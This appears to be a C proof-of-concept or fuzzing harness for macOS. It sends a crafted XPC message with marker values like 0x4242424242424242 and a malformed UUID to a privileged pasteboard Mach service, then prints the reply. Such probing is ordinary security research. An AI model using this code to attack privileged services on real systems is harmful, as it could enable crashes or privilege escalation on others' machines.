//#include "fuzz_interface.h"
#include <xpc/xpc.h>
#include <xpc/connection.h>
#include <stdio.h>
//#include <Foundation/Foundation.h>


int main(int argc, char *argv[])
{
  //*((uint64_t *)(context + 0x210)) = 0x4141414141414141;
	// create the XPC connection to sysmond
	xpc_connection_t conn = xpc_connection_create_mach_service(argv[1], NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
	//xpc_connection_set_context(conn, context);

	xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
		xpc_type_t t = xpc_get_type(event);
		if (t == XPC_TYPE_ERROR){
			printf("err: %s\n", xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION));
		}
		printf("received an event\n");
	});
	xpc_connection_resume(conn);

	char *msg_str = "com.apple.pboard.register-entrie";
	const char *uuid = "123456789qwertyuiop123456789";

	xpc_object_t arr = xpc_array_create(NULL, 0);
  xpc_object_t arr_elem1 = xpc_dictionary_create(NULL, NULL, 0);
  xpc_dictionary_set_int64(arr_elem1, "CFPreferencesOperation", 4);
	xpc_array_append_value(arr, arr_elem1);

	//char *keys = {"clientName","messageAction", "AssetType"};
	xpc_object_t msg = xpc_dictionary_create(NULL,NULL,0);
	xpc_dictionary_set_string(msg, "com.apple.pboard.message", msg_str);
	xpc_dictionary_set_uint64(msg, "com.apple.pboard.change", 0x6666666666666666);
	xpc_dictionary_set_uint64(msg, "com.apple.pboard.generation", 0x4242424242424242);
	xpc_dictionary_set_uuid(msg, "com.apple.pboard.uuid", uuid);
	xpc_dictionary_set_string(msg, "com.apple.pboard.pboardName", "CFPasteboardUnique-22b0b46678");
	xpc_dictionary_set_value(msg, "com.apple.pboard.entry-array", arr);

	char *desc_msg = xpc_copy_description(msg);
	printf("our message: %s\n", desc_msg);

	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);

	char *desc = xpc_copy_description(reply);
	printf("reply: %s\n", desc);
//	NSLog(@"reply: %@", reply);
	//com.apple.mobileassetd
	return 0;
}
